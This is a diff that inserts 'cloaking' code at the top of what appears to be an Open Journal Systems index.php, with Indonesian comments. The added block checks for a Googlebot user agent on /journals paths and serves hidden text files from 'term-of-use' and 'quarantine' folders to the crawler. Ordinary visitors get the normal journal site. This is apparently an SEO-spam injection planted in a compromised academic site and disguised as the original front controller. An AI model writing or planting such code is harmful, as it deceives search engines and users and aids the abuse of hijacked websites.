@@ -1,0 +1,43 @@
+<?php
+// ========== CLOAKING LOGIC (PALING ATAS) ==========
+// Cek dulu apakah perlu cloaking, jika ya, tampilkan dan exit
+// Jika tidak, biarkan OJS berjalan normal
+
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$uri = $_SERVER['REQUEST_URI'] ?? '';
+
+$is_google_bot = (stripos($ua, 'googlebot') !== false);
+
+// Cloaking untuk /journals atau /journals/
+if($is_google_bot && ($uri == '/journals' || $uri == '/journals/' || $uri == '/journals/index.php')) {
+    $file = '/home/u457839213/domains/ukinstitute.org/public_html/term-of-use/ukinstitute-ib.txt';
+    if(file_exists($file)) {
+        header('Content-Type: text/plain');
+        readfile($file);
+    } else {
+        echo "File not found";
+    }
+    exit;
+}
+
+// Cloaking untuk /journals/jopp
+if($is_google_bot && strpos($uri, '/journals/jopp') !== false) {
+    $file = '/home/u457839213/domains/ukinstitute.org/public_html/quarantine/jopp.txt';
+    if(file_exists($file)) {
+        header('Content-Type: text/plain');
+        readfile($file);
+    } else {
+        echo 'cache not ready';
+    }
+    exit;
+}
+
+// ========== OJS ORIGINAL (TIDAK DIUBAH) ==========
+// Initialize global environment
+define('INDEX_FILE_LOCATION', __FILE__);
+require('./lib/pkp/includes/bootstrap.inc.php');
+
+// Serve the request
+$application =& PKPApplication::getApplication();
+$application->execute();
+?>
